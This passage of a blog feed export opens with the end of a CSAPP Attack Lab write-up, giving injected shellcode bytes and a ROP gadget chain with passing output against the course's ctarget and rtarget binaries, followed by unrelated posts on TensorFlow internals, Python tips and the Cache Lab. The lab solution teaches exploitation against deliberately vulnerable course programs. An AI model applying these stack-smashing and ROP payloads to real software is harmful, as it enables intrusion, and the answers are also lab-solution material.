<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 98 dc 61 55 	mov    $0x5561dc98,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>生成最终的字节码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat phase3.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><p>从Phase4开始，攻击手段变为ROP(Return-Oriented Programming), 并且使用了<strong>栈随机化</strong>和<strong>限制可执行代码区域</strong>。ROP使用现存的代码进行攻击，而不是注入攻击代码。使用ROP的诀窍是找到现存程序中存在ret指令的代码。这些代码一般被叫做gadget.</p>
<p>Phase4的任务与Phase2相同，传递cookie(0x59b997fa)到touch2(0x4017ec), 但是攻击的程序变成rtarget. rtarge内的gadget限定在start_farm和mid_farm之间。</p>
<p>要把cookie作为一个参数，我们只能把cookie写入到(%rsp)，然后弹出。所以首先我们要查找pop指令，pop系列指令如下</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/pop.png" alt="pop"></p>
<p>所以我们要查找<code>5x c3</code>这样的指令，x可以指代<code>8,9,a,b,c,d,e,f</code>。然后再查找mov指令。构成<code>pop %x; mov %x %rdi; ret</code>这样的指令，完成cookie传送。其中mov指令如下：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/mov.png" alt="mov"></p>
<p>还有有两个比较重要的指令</p>
<ul>
<li>ret: 返回 0xc3</li>
<li>nop: 什么都不做，只是让程序计数器加一 0x90</li>
</ul>
<p>由于0x90没有任何意义，所以它可以出现在任何地方。</p>
<p>顺着代码查找，很快就可以找到一个gadget: <code>58 90 c3 pop %rax; ret;</code>，地址在0x4019cc.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3</span><br></pre></td></tr></table></figure>
<p>接着查找<code>mov %rax %rdi</code>对应的字节码<code>48 89 c7</code>。直接搜索<code>48 89 c7 c3</code>, 地址在0x4019a2.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>最终形成的字符输入为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00 # pop %rax; ret</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 # mov %rax %rdi; ret;</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2的返回地址</span><br></pre></td></tr></table></figure>
<p>执行结果为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat phase4.txt| ./hex2raw| ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CSAPP Lab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[3 TF代码分析初步]]></title>
      <url>/wiki/2017/12/30/TensorFlow-3-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%88%9D%E6%AD%A5/</url>
      <content type="html"><![CDATA[<h2 id="3-1-TF总体概述"><a href="#3-1-TF总体概述" class="headerlink" title="3.1 TF总体概述"></a>3.1 TF总体概述</h2><p>为了对TF有整体描述，本章节将选取TF白皮书中的示例展开说明，如图 3-1所示是一个简单线性模型的TF正向计算图和反向计算图。图中x是输入，W是参数权值，b是偏差值，MatMul和Add是计算操作，dMatMul和dAdd是梯度计算操作，C是正向计算的目标函数，1是反向计算的初始值，dC/dW和dC/dx是模型参数的梯度函数。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148928910614.jpg" alt=""></p>
<p>以图 3-1为例实现的TF代码见图 3-2。首先声明参数变量W、b和输入变量x，构建线性模型$y=W*x+b$，目标函数loss采用误差平方和最小化方法，优化函数optimizer采用随机梯度下降方法。然后初始化全局参数变量，利用session与master交互实现图计算。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148928967117.jpg" alt=""><br><img src="http://or9a8nskt.bkt.clouddn.com/15148929012499.jpg" alt=""></p>
<p>图 3-2中summary可以记录graph元信息和tensor数据信息，再利用Tensorboard分析模型结构和训练参数。</p>
<p>图 3-3是上述代码在Tensorboard中记录下的Tensor跟踪图。Tensorboard可以显示scaler和histogram两种形式。跟踪变量走势可更方便的分析模型和调整参数。<br><img src="http://or9a8nskt.bkt.clouddn.com/15148929090396.jpg" alt=""></p>
<p>图 3-4是图 3-1示例在Tensorboard中显示的graph图。左侧子图描述的正向计算图和反向计算图，正向计算的输出被用于反向计算的输入，其中MatMul对应MatMul_grad，Add对应Add_grad等。右上侧子图指明了目标函数最小化训练过程中要更新的模型参数W、b，右下侧子图是参数节点W、b展开后的结果。<br><img src="http://or9a8nskt.bkt.clouddn.com/15148929127069.jpg" alt=""></p>
<p>图 3-4中，参数W是命名空间（Namespace）类型，展开后的W主要由Assign和Read两个OpNode组成，分别负责W的赋值和读取任务。</p>
<p>命名空间gradients是隐含的反向计算图，定义了反向计算的计算逻辑。从图 3-1可以看出，更新参数W需要先计算dMatMul，即图 3-4中的MatMul_grad操作，而Update_W节点负责更新W操作。为了进一步了解UpdateW的逻辑，图 3-5对MatMul_grad和update_W进行了展开分析。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148929304603.jpg" alt=""></p>
<p>图 3-5中，子图(a)描述了MatMul_grad计算逻辑，子图(b)描述了MatMul_grad输入输出，子图(c)描述了update_W的计算逻辑。首先明确MatMul矩阵运算法则，假设 z=MatMul(x, y)，则有dx = MatMul(dz, y)，dy = MatMul(x, dz)，由此可以推出dW=MatMul(dAdd, x)。在子图(a)中左下侧的节点b就是输入节点x，dAdd由Add_grad计算输出。update_W的计算逻辑由最优化函数指定，而其中的minimize/update_W/ApplyGradientDescent变量决定，即子图(b)中的输出变量Outputs。</p>
<p>另外，在MatMul_grad/tuple命名空间中还隐式声明了control dependencies控制依赖操作，这在章节2.4控制流中相关说明。</p>
<h2 id="3-2-Eigen介绍"><a href="#3-2-Eigen介绍" class="headerlink" title="3.2 Eigen介绍"></a>3.2 Eigen介绍</h2><p>在Tensorflow中核心数据结构和运算主要依赖于Eigen和Stream Executor库，其中Eigen支持CPU和GPU加速计算，Stream Executor主要用于GPU环境加速计算。下面简单讲述Eigen库的相关特性，有助于进一步理解Tensorflow。</p>
<h3 id="3-2-1-Eigen简述"><a href="#3-2-1-Eigen简述" class="headerlink" title="3.2.1 Eigen简述"></a>3.2.1 Eigen简述</h3><p>Eigen是高效易用的C++开源库，有效支持线性代数，矩阵和矢量运算，数值分析及其相关的算法。不依赖于任何其他依赖包，安装使用都很简便[8]。具有如下特性：</p>
<ul>
<li><p>支持整数、浮点数、复数，使用模板编程，可以为特殊的数据结构提供矩阵操作。比如在用ceres-solver进行做优化问题（比如bundle adjustment）的时候，有时候需要用模板编程写一个目标函数，ceres可以将模板自动替换为内部的一个可以自动求微分的特殊的double类型。而如果要在这个模板函数中进行矩阵计算，使用Eigen就会非常方便。</p>
</li>
<li><p>支持逐元素、分块、和整体的矩阵操作。</p>
</li>
<li><p>内含大量矩阵分解算法包括<code>LU</code>，<code>LDLt</code>，<code>QR</code>、<code>SVD</code>等等。</p>
</li>
<li><p>支持使用<code>Intel MKL</code>加速</p>
</li>
<li><p>部分功能支持多线程</p>
</li>
<li><p>稀疏矩阵支持良好，到今年新出的<code>Eigen3.2</code>，已经自带了<code>SparseLU</code>、<code>SparseQR</code>、共轭梯度<code>Tensor</code>（ConjugateGradient solver）、bi conjugate gradient stabilized solver等解稀疏矩阵的功能。同时提供SPQR、UmfPack等外部稀疏矩阵库的接口。</p>
</li>
<li><p>支持常用几何运算，包括旋转矩阵、四元数、矩阵变换、AngleAxis（欧拉角与Rodrigues变换）等等。</p>
</li>
<li><p>更新活跃，用户众多（Google、WilliowGarage也在用），使用Eigen的比较著名的开源项目有ROS（机器人操作系统）、PCL（点云处理库）、Google Ceres（优化算法）。OpenCV自带到Eigen的接口。</p>
</li>
</ul>
<p>Eigen库包含<code>Eigen</code>模块和<code>unsupported</code>模块，其中<code>Eigen</code>模块为<code>official module</code>，<code>unsupported</code>模块为开源贡献者开发的。</p>
<p>Eigen<code>unsupported</code> 模块中定义了数据类型<code>Tensor</code>及相关函数，包括<code>Tensor</code>的存储格式，<code>Tensor</code>的符号表示，<code>Tensor</code>的编译加速，<code>Tensor</code>的一元运算、二元运算、高维度泛化矩阵运算，<code>Tensor</code>的表达式计算。本章后续所述<code>Tensor</code>均为<code>Eigen::Tensor</code></p>
<p>Eigen运算性能评估如图 3-6所示，eigen3的整体性能比eigen2有很大提升，与<code>GOTO2</code>、<code>INTEL_MKL</code>基本持平。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148929413896.jpg" alt=""></p>
<h3 id="3-2-2-Eigen-存储顺序"><a href="#3-2-2-Eigen-存储顺序" class="headerlink" title="3.2.2 Eigen 存储顺序"></a>3.2.2 Eigen 存储顺序</h3><p>Eigen中的<code>Tensor</code>支持两种存储方式:</p>
<ul>
<li><p>Row-major表示矩阵存储时按照row-by-row的方式。</p>
</li>
<li><p>Col-major表示矩阵存储时按照column-by-column的方式。</p>
</li>
</ul>
<p>Eigen默认采用<code>Col-major</code>格式存储的（虽然也支持Row-major，但不推荐），具体采用什么存储方式取决于算法本身是行遍历还是列遍历为主。例如：<code>A=[[a11, a12, a13], [a21, a22, a23]]</code>的存储序列见图3-7。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148929467282.jpg" alt=""></p>
<h3 id="3-2-3-Eigen-惰性求值"><a href="#3-2-3-Eigen-惰性求值" class="headerlink" title="3.2.3 Eigen 惰性求值"></a>3.2.3 Eigen 惰性求值</h3><p>在编程语言理论中，存在及早求值(<code>Eager Evaluation</code>) 和惰性求值（<code>Lazy Evaluation</code>）</p>
<ul>
<li><p>及早求值：大多数编程语言所拥有的普通计算方式</p>
</li>
<li><p>惰性求值：也认为是“延迟求值”，可以提高计算性能，最重要的好处是它可以构造一个无限的数据类型。</p>
</li>
</ul>
<p>关于惰性求值，举例如下：</p>
<p><code>Vec3 = vec1 + vec2</code>;</p>
<p>及早求值形式需要临时变量<code>vec_temp</code>存储运算结果，再赋值给<code>vec3</code>，计算效率和空间效率都不高：</p>
<p><code>Vec_temp = vec1 + vec2;
Vec3 = vec_temp</code></p>
<p>而惰性求值不需要临时变量保存中间结果，提高了计算性能：</p>
<p><code>Vec_symbol_3 = (vec_symbol_1 + vec_symbol_2);
Vec3 = vec_symbol_3.eval(vec1, vec2)</code></p>
<p>由于Eigen默认采用惰性计算，如果要求表达式的值可以使用<code>Tensor::eval()</code>函数。<code>Tensor::eval()</code>函数也是<code>session.run()</code>的底层运算。例如：</p>
<p><code>Tensor result = ((t1 + t2).eval() * 0.2f).exp()</code></p>
<h3 id="3-2-4-Eigen-编译加速"><a href="#3-2-4-Eigen-编译加速" class="headerlink" title="3.2.4 Eigen 编译加速"></a>3.2.4 Eigen 编译加速</h3><p>编译加速可以充分发挥计算机的并行计算能力，提高程序运行速度。</p>
<p>举例如下：</p>
<p>普通的循环相加运算时间复杂度是$O(n)$：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; size; i++)</span><br><span class="line">    u[i] = v[i] + w[i];</span><br></pre></td></tr></table></figure>
<p>如果指令集支持128bit并行计算，则时间复杂度可缩短为$O(n/4)$：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; <span class="number">4</span>*(size/<span class="number">4</span>); i+=<span class="number">4</span>)</span><br><span class="line">    u.packet(i) = v.packet(i) + w.packet(i);</span><br></pre></td></tr></table></figure>
<p>Eigen编译时使用了<code>SSE2</code>加速。假设处理<code>float32</code>类型，指令集支持<code>128bit</code>并行计算，则一次可以计算4个<code>float32</code>类型，速度提升4倍。</p>
<h3 id="3-2-5-Eigen-half"><a href="#3-2-5-Eigen-half" class="headerlink" title="3.2.5 Eigen::half"></a>3.2.5 Eigen::half</h3><p>Tensorflow支持的浮点数类型有<code>float16</code>, <code>float32</code>, <code>float64</code>，其中<code>float16</code>本质上是<code>Eigen::half</code>类型，即半精度浮点数。关于半精度浮点数，英伟达2002年首次提出使用半精度浮点数达到降低数据传输和存储成本的目的。</p>
<p>在分布式计算中，如果对数据精度要求不那么高，可以将传输数据转换为<code>float16</code>类型，这样可以大大缩短设备间的数据传输时间。在GPU运算中，<code>float16</code>还可以减少一般的内存占用。</p>
<p>在Tensorflow的分布式传输中，默认会将<code>float32</code>转换为<code>float16</code>类型。Tensorflow的转换方式不同于Nvidia的标准，采用直接截断尾数的方式转化为半精度浮点数，以减少转换时间。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148931707077.jpg" alt=""></p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148931776685.jpg" alt=""></p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148931813272.jpg" alt=""></p>
<p>浮点数存储格式分成3部分，符号位，指数和尾数。不同精度是指数位和尾数位的长度不一样。</p>
<h2 id="3-3-设备内存管理"><a href="#3-3-设备内存管理" class="headerlink" title="3.3 设备内存管理"></a>3.3 设备内存管理</h2><p>TF设备内存管理模块利用<code>BFC</code>算法（<code>best-fit with coalescing</code>）实现。<code>BFC</code>算法是<code>Doung Lea’s malloc(dlmalloc)</code>的一个非常简单的版本。它具有内存分配、释放、碎片管理等基本功能。</p>
<p>BFC将内存分成一系列内存块，每个内存块由一个<code>chunk</code>数据结构管理。从<code>chunk</code>结构中可以获取到内存块的使用状态、大小、数据的基址、前驱和后继<code>chunk</code>等信息。整个内存可以通过一个<code>chunk</code>的双链表结构来表示。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148887566906.jpg" alt=""></p>
<p>用户申请一个内存块（<code>malloc</code>）。根据建立的<code>chunk</code>双链表找到一个合适的内存块（后面会说明什么是合适的内存块），如果该内存块的大小是用户申请大小的两倍以上，那么将该内存块切分成两块，这就是split操作。返回其中一块给用户，并将该内存块标识为占用。Spilt操作会新增一个<code>chunk</code>，所以需要修改<code>chunk</code>双链表以维持前驱和后继关系。</p>
<p>用户释放一个内存块（free）。先将该块标记为空闲。然后根据<code>chunk</code>数据结构中的信息找到其前驱和后继内存块。如果前驱和后继块中有空闲的块，那么将刚释放的块和空闲的块合并成一个更大的<code>chunk</code>（这就是merge操作，合并当前块和其前后的空闲块）。再修改双链表结构以维持前驱后继关系。这就做到了内存碎片的回收。</p>
<p><code>BFC</code>的核心思想是：将内存分块管理，按块进行空间分配和释放；通过<code>split</code>操作将大内存块分解成小内存块；通过<code>merge</code>操作合并小的内存块，做到内存碎片回收。</p>
<p>但是还留下许多疑问。比如说申请内存空间时，什么样的块算合适的内存块？如何快速管理这种块？</p>
<p><code>BFC</code>算法采取的是被动分块的策略。最开始整个内存是一个<code>chunk</code>，随着用户申请空间的次数增加，最开始的大<code>chunk</code>会被不断的split开来，从而产生越来越多的小<code>chunk</code>。当<code>chunk</code>数量很大时，为了寻找一个合适的内存块而遍历双链表无疑是一笔巨大的开销。为了实现对空闲块的高效管理，<code>BFC</code>算法设计了bin这个抽象数据结构。</p>
<p>Bin数据结构中，每个bin都有一个size属性，一个bin是一个拥有<code>chunk</code> size &gt;= bin size的空闲<code>chunk</code>的集合。集合中的<code>chunk</code>按照<code>chunk</code> size的升序组织成单链表。<code>BFC</code>算法维护了一个bin的集合：bins。它由多个bin以及从属于每个bin的<code>chunk</code>s组成。内存中所有的空闲<code>chunk</code>都由bins管理。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148887792693.jpg" alt=""></p>
<p>图 3-12中每一列表示一个bin，列首方格中的数字表示bin的size。bin size的大小都是256的$2^n$的倍。每个bin下面挂载了一系列的空闲<code>chunk</code>，每个<code>chunk</code>的<code>chunk</code> size都大于等于所属的bin的bin size，按照<code>chunk</code> size的升序挂载成单链表。<code>BFC</code>算法针对bins这个集合设计了三个操作：<code>search</code>、<code>insert</code>、<code>delete</code>。</p>
<ul>
<li><p><code>Search</code> 操作：给定一个<code>chunk</code> size，从bins中找到大于等于该<code>chunk</code> size的最小的那个空闲<code>chunk</code>。Search操作具体流程如下。如果bin以数组的形式组织，那么可以从index = <code>chunk</code> size /256 &gt;&gt;2的那个bin开始查找。最好的情况是开始查找的那个bin的<code>chunk</code>链表非空，那么直接返回链表头即可。这种情况时间复杂度是常数级的。最坏的情况是遍历bins数组中所有的bin。对于一般大小的内存来说，bins数组元素非常少，比如4G空间只需要23个bin就足够了（256 * 2 ^ 23 &gt; 4G），因此也很快能返回结果。总体来说search操作是非常高效的。对于固定大小内存来说，查找时间是常数量级的。</p>
</li>
<li><p><code>Insert</code> 操作：将一个空闲的<code>chunk</code>插入到一个bin所挂载的<code>chunk</code>链表中，同时需要维持<code>chunk</code>链表的升序关系。具体流程是直接将<code>chunk</code>插入到index = <code>chunk</code> size /256 &gt;&gt;2的那个bin中即可。</p>
</li>
<li><p><code>Delete</code>操作：将一个空闲的<code>chunk</code>从bins中移除。</p>
</li>
</ul>
<p>TF中内存分配算法实现文件<code>core/common_runtime/bfc_allocator.cc</code>，GPU内存分配算法实现文件<code>core/common_runtime/gpu/gpu_bfc_allocator.cc</code>。</p>
<h2 id="3-4-TF开发工具介绍"><a href="#3-4-TF开发工具介绍" class="headerlink" title="3.4 TF开发工具介绍"></a>3.4 TF开发工具介绍</h2><p>TF系统开发使用了<code>bazel</code>工具实现工程代码自动化管理，使用了<code>protobuf</code>实现了跨设备数据传输，使用了<code>swig</code>库实现python接口封装。本章将从这三方面介绍TF开发工具的使用。</p>
<h3 id="3-4-1-Swig封装"><a href="#3-4-1-Swig封装" class="headerlink" title="3.4.1 Swig封装"></a>3.4.1 Swig封装</h3><p>Tensorflow核心框架使用C++编写，API接口文件定义在<code>tensorflow/core/public</code>目录下，主要文件是<code>tensor_c_api.h</code>文件，C++语言直接调用这些头文件即可。</p>
<p>Python通过<code>Swig</code>工具封装TF库包间接调用，接口定义文件<code>tensorflow/python/ tensorflow.i</code>。其中<code>swig</code>全称为S<code>implified Wrapper and Interface Generator</code>，是封装C/C++并与其它各种高级编程语言进行嵌入联接的开发工具，对swig感兴趣的请参考相关文档。</p>
<p>在<code>tensorflow.i</code>文件中包含了若干个<code>.i</code>文件，每个文件是对应模块的封装，其中<code>tf_session.i</code>文件中包含了<code>tensor_c_api.h</code>，实现<code>client</code>向<code>session</code>发送请求创建和运行<code>graph</code>的功能。</p>
<h3 id="3-4-2-Bazel编译和调试"><a href="#3-4-2-Bazel编译和调试" class="headerlink" title="3.4.2 Bazel编译和调试"></a>3.4.2 Bazel编译和调试</h3><p><code>Bazel</code>是Google开源的自动化构建工具，类似于Make和CMake工具。<code>Bazel</code>的目标是构建“快速并可靠的代码”，并且能“随着公司的成长持续调整其软件开发实践”。</p>
<p>TF中几乎所有代码编译生成都是依赖<code>Bazel</code>完成的，了解<code>Bazel</code>有助于进一步学习TF代码，尤其是编译测试用例进行gdb调试。</p>
<p><code>Bazel</code>假定每个目录为[package]单元，目录里面包含了源文件和一个描述文件BUILD，描述文件中指定了如何将源文件转换成构建的输出。</p>
<p>以图 3-13为例，左子图为工程中不同模块间的依赖关系，右子图是对应模块依赖关系的BUILD描述文件。</p>
<p>图 3-13中name属性来命名规则，srcs属性为模块相关源文件列表，deps属性来描述规则之间的依赖关系。”//search: google_search_page”中”search”是包名，”google_search_page”为规则名，其中冒号用来分隔包名和规则名；如果某条规则所依赖的规则在其他目录下，就用”//“开头，如果在同一目录下，可以忽略包名而用冒号开头。</p>
<p>图 3-13中<code>cc_binary</code>表示编译目标是生成可执行文件，<code>cc_library</code>表示编译目标是生成库文件。如果要生成g<code>oogle_search_page</code>规则可运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bazel buid -c opt // search: google_search_page</span><br></pre></td></tr></table></figure>
<p>如果要生成可调试的二进制文件，可运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bazel buid -c dbg // search: google_search_page</span><br></pre></td></tr></table></figure>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148888013357.jpg" alt=""></p>
<p>TF中首次运行<code>bazel</code>时会自动下载很多依赖包，如果有的包下载失败，打开<code>tensorflow/workspace.bzl</code>查看是哪个包下载失败，更改对应依赖包的<code>new_http_archive</code>中的url地址，也可以把<code>new_http_archive</code>设置为本地目录<code>new_local_repository</code>。</p>
<p>TF中测试用例跟相应代码文件放在一起，如<code>MatMul</code>操作的<code>core/kernels/matmul_op.cc</code>文件对应的测试用例文件为<code>core/kernels/matmul_op_test.cc</code>文件。运行这个测试用例需要查找这个测试用例对应的BUILD文件和对应的命令规则，如<code>matmul_op_test.cc</code>文件对应的BUILD文件为<code>core/kernels/BUILD</code>文件，如下</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148933046986.jpg" alt=""></p>
<p>其中<code>tf_cuda_cc_test</code>函数是TF中自定义的编译函数，函数定义在<code>/tensorflow/ tensorflow.bzl</code>文件中，它会把<code>matmul_op_test.cc</code>放进编译文件中。要生成<code>matmul_op_test</code>可执行文件可运行如下脚本：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148933132091.jpg" alt=""></p>
<h3 id="3-4-3-Protobuf序列化"><a href="#3-4-3-Protobuf序列化" class="headerlink" title="3.4.3 Protobuf序列化"></a>3.4.3 Protobuf序列化</h3><p><code>Protocol Buffers</code> 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。</p>
<p><code>Protobuf</code>对象描述文件为<code>.proto</code>类型，编译后生成<code>.pb.h</code>和<code>.pb.cc</code>文件。</p>
<p><code>Protobuf</code>主要包含读写两个函数：Writer（序列化）函数<code>SerializeToOstream()</code>和  Reader（反序列化）函数 <code>ParseFromIstream()</code>。</p>
<p>Tensorflow在<code>core/probobuf</code>目录中定义了若干与分布式环境相关的.proto文件，同时在core/framework目录下定义了与基本数据类型和结构的.proto文件，在core/util目录中也定义部分.proto文件，感觉太随意了。</p>
<p>在分布式环境中，不仅需要传输数据序列化，还需要数据传输协议。<code>Protobuf</code>在序列化处理后，由<code>gRPC</code>完成数据传输。<code>gRPC</code>数据传输架构图见图3-14。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148888381032.jpg" alt=""></p>
<p><code>gRPC</code>服务包含客户端和服务端。<code>gRPC</code>客户端调用<code>stub</code> 对象将请求用 <code>protobuf</code> 方式序列化成字节流，用于线上传输，到 <code>server</code>端后调用真正的实现对象处理。gRPC的服务端通过observer观察处理返回和关闭通道。</p>
<p>TF使用gRPC完成不同设备间的数据传输，比如超参数、梯度值、graph结构。</p>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Records]]></title>
      <url>/wiki/2017/12/30/Python-Records/</url>
      <content type="html"><![CDATA[<h4 id="Get-key-name-from-Python-KeyError-exception"><a href="#Get-key-name-from-Python-KeyError-exception" class="headerlink" title="Get key name from Python KeyError exception"></a>Get key name from Python KeyError exception</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    x2 = myDict[<span class="string">'key2'</span>]</span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:    </span><br><span class="line">    <span class="keyword">print</span> e.args[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h4 id="How-to-print-without-newline-or-space"><a href="#How-to-print-without-newline-or-space" class="headerlink" title="How to print without newline or space?"></a>How to print without newline or space?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'.'</span>, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Lab4 Cache Lab]]></title>
      <url>/wiki/2017/12/30/CSAPP-Lab-Cache-Lab/</url>
      <content type="html"><![CDATA[<p>CMU 15-213 Lab4 Cache Lab</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/labs.html">Lab 下载地址</a></li>
<li><a href="https://scs.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx#folderID=%22b96d90ae-9871-4fae-91e2-b1627b43e25e%22">Recitation讲解</a></li>
</ul>
<p>Cache Lab可以帮助理解缓存对C程序的影响。Lab包括两部分，第一部分用C语言写一个缓存模拟器，第二部分写一个小型矩阵的转置函数，使缓存不命中降到最低。</p>
<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>Part A的任务是写一个C语言缓存模拟器，输入Valgrind的<code>trace file</code>，输出缓存命中次数hit_count，缓存不命中次数miss_count,驱逐次数eviction_count.</p>
